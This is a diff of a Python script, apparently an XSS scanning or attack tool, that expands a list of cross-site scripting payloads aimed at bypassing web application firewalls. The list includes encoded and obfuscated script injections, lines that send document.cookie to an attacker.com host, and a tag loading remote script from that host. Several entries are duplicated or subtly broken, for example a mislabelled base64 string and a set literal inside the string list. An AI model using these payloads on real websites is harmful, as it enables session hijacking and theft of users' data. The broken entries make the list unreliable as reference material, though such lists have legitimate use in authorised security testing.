@@ -24,41 +24,204 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Define XSS payloads with WAF bypass techniques
 XSS_PAYLOADS = [
+    # -------------------------
     # Simple Payloads
+    # -------------------------
     "<script>alert('XSS')</script>",
     "%3Cscript%3Ealert('XSS')%3C/script%3E",
     "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
     
-    # Attribute-Based
+    # -------------------------
+    # Attribute-Based Payloads
+    # -------------------------
     "\"><script>alert('XSS')</script>",
     "'\"><img src=x onerror=alert('XSS')>",
     "';alert('XSS');//",
+    "\"><img src=x onerror=alert('XSS')>",
+    "';alert(document.cookie);//",
+    "\";alert(document.domain);//",
+    "';javascript:alert('XSS');//",
     
-    # SVG and Other Tags
+    # -------------------------
+    # Event Handlers
+    # -------------------------
+    "<div onmouseover=\"alert('XSS')\">Hover me!</div>",
+    "<input type=\"text\" value=\"\"><script>alert('XSS')</script>",
+    "<img src=\"x\" onerror=\"alert('XSS')\">",
+    "<body onload=\"alert('XSS')\">",
     "<svg/onload=alert('XSS')>",
-    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
-    "<body onload=alert('XSS')>",
+    "<video><source onerror=\"alert('XSS')\"></video>",
+    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
     
+    # -------------------------
+    # SVG and Other Tags
+    # -------------------------
+    "<svg><script>alert('XSS')</script></svg>",
+    "<math href=\"javascript:alert('XSS')\">X</math>",
+    "<audio><source src=\"nonexistent.file\" onerror=\"alert('XSS')\"></audio>",
+    "<marquee onstart=\"alert('XSS')\">Test</marquee>",
+    "<object data=\"javascript:alert('XSS')\"></object>",
+    
+    # -------------------------
     # Alternative Encodings
+    # -------------------------
     "<scr\0ipt>alert('XSS')</scr\0ipt>",
     "<scr&#x69;pt>alert('XSS')</scr&#x69;pt>",
     "<scri%00pt>alert('XSS')</scri%00pt>",
+    "<script>alert(String.fromCharCode(88,83,83))</script>",  # Alert via char codes
+    "<script>alert(String.fromCharCode(0x58,0x53,0x53))</script>",
+    "<script>alert(eval('0x58'+'0x53'+'0x53'))</script>",
+    "<script>alert(String.fromCharCode(88,83,83))</script>",
     
+    # -------------------------
     # Double Encoding
+    # -------------------------
     "%253Cscript%253Ealert('XSS')%253C/script%253E",
+    "%252525253Cscript%252525253Ealert('XSS')%252525253C/script%252525253E",
     
-    # Polyglots
+    # -------------------------
+    # DOM-Based Payloads
+    # -------------------------
+    "<script>document.write('<img src=x onerror=alert(\"XSS\")>');</script>",
+    "<script>document.location='javascript:alert(\"XSS\")'</script>",
+    "<script>window.location='javascript:alert(\"XSS\")'</script>",
+    "<script>history.pushState({}, '', 'javascript:alert(\"XSS\")')</script>",
+    
+    # -------------------------
+    # Framework-Specific Payloads
+    # -------------------------
+    # AngularJS (Older Versions)
+    "<div ng-app=\"\"><script>alert('XSS')</script></div>",
+    "<img src=x onerror=alert('XSS')//>",
+    
+    # ReactJS
+    "<div dangerouslySetInnerHTML={{__html: '<script>alert(\"XSS\")</script>'}}></div>",
+    
+    # -------------------------
+    # URL-Based Payloads
+    # -------------------------
+    "/%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "/\x3Cscript\x3Ealert('XSS')\x3C/script\x3E",
+    "/%253Cscript%253Ealert('XSS')%253C/script%253E",
+    
+    # -------------------------
+    # Base64 Encoded Payloads
+    # -------------------------
+    "<script>alert(atob('WFBTIik='))</script>",  # atob('XSS")
+    "<img src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPjwvc3ZnPg==' onerror='alert(atob(\"WFBTIik=\"))'>",
+    
+    # -------------------------
+    # Polyglot Payloads
+    # -------------------------
     "<svg><script>alert('XSS')</script></svg>",
     "<math href=\"javascript:alert('XSS')\">X</math>",
+    "<style>@import 'javascript:alert(\"XSS\")';</style>",
     
-    # Event Handlers
-    "<div onmouseover=\"alert('XSS')\">Hover me!</div>",
-    "<input type=\"text\" value=\"\"><script>alert('XSS')</script>",
+    # -------------------------
+    # Obfuscated Payloads
+    # -------------------------
+    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+    "<script>alert(`XSS`)</script>",
+    "<script>alert(`XSS`);</script>",
+    "<script>alert(`XSS`);</script>",
+    "<script>alert('XSS'+'');</script>",
     
-    # Miscellaneous
-    "<details open ontoggle=alert('XSS')></details>",
-    "<video><source onerror=\"alert('XSS')\">",
+    # -------------------------
+    # Alternate Tag Payloads
+    # -------------------------
+    "<blink><script>alert('XSS')</script></blink>",
+    "<center><script>alert('XSS')</script></center>",
+    "<marquee behavior='alternate'><script>alert('XSS')</script></marquee>",
+    
+    # -------------------------
+    # Comprehensive Polyglot
+    # -------------------------
+    "<script>document.write('<img src=x onerror=alert(\"XSS\")>');</script>",
+    "<img src=x onerror=alert(document.cookie)>",
+    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+    
+    # -------------------------
+    # Self-Executing JavaScript
+    # -------------------------
+    "<script>(function(){alert('XSS')})()</script>",
+    "<script>void(alert('XSS'))</script>",
+    "<script>new Function('alert(\"XSS\")')()</script>",
+    
+    # -------------------------
+    # Cookie Theft Payloads
+    # -------------------------
+    "<script>fetch('http://attacker.com/stealcookie?cookie=' + document.cookie)</script>",
+    "<script>new Image().src='http://attacker.com/stealcookie?cookie=' + document.cookie</script>",
+    
+    # -------------------------
+    # Storage-Based Payloads
+    # -------------------------
+    "<script>localStorage.setItem('XSS','<img src=x onerror=alert(\"XSS\")>')</script>",
+    "<script>sessionStorage.setItem('XSS','<img src=x onerror=alert(\"XSS\")>')</script>",
+    
+    # -------------------------
+    # Advanced Bypass Techniques
+    # -------------------------
+    "<script>alert(String.fromCharCode(88,83,83))</script>",  # alert(XSS)
+    "<script>alert(`XSS`)</script>",
+    "<script>/*<script>alert('XSS')</script>*/alert('XSS')</script>",
+    "<script>alert('XSS')/*</script>*/</script>",
+    "<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>",
+    "<svg/onload=alert('XSS')>",
+    "<script>var a='XSS'; alert(a)</script>",
+    "<script>alert(document.URL)</script>",
+    "<script>alert(document.title)</script>",
+    "<script>alert(location.hash)</script>",
+    
+    # -------------------------
+    # Event Attributes with Encodings
+    # -------------------------
+    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;>",
+    "<img src=x onerror=alert&#40;'XSS'&#41;>",
+    "<img src=x onerror=alert(&#39;XSS&#39;) />",
+    
+    # -------------------------
+    # Template Injection Payloads
+    # -------------------------
+    "{{alert('XSS')}}",
+    "{{7*7}}<script>alert('XSS')</script>",
+    "${alert('XSS')}",
+    "{% alert('XSS') %}",
+    
+    # -------------------------
+    # HTML Entity Encoded Payloads
+    # -------------------------
+    "<script>alert(&quot;XSS&quot;)</script>",
+    "<script>alert(&#x58;&#x53;&#x53;)</script>",  # alert(XSS)
+    "<script>alert(&#88;&#83;&#83;)</script>",
+    "<img src=x onerror=alert(&#x58;&#x53;&#x53;)>",
+    "<img src=x onerror=alert(&#88;&#83;&#83;) />",
+    
+    # -------------------------
+    # Unicode Encoded Payloads
+    # -------------------------
+    "<script>alert('\u0058\u0053\u0053')</script>",  # alert('XSS')
+    "<img src=x onerror=alert('\u0058\u0053\u0053') />",
+    
+    # -------------------------
+    # Base64 Encoded Payloads
+    # -------------------------
+    "<script>alert(atob('WFBTIik='))</script>",  # atob('XSS")
+    "<img src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPjwvc3ZnPg==' onerror='alert(atob(\"WFBTIik=\"))'>",
+    
+    # -------------------------
+    # CSS-Based Payloads
+    # -------------------------
+    "<style>@import 'javascript:alert(\"XSS\")';</style>",
+    "<style>body {background-image: url(javascript:alert('XSS'))}</style>",
+    
+    # -------------------------
+    # JSON-Based Payloads
+    # -------------------------
+    {"<script>alert('XSS')</script>"},
+
 ]
+
 
 def generate_random_string(length=8):
     """Generates a random alphanumeric string."""
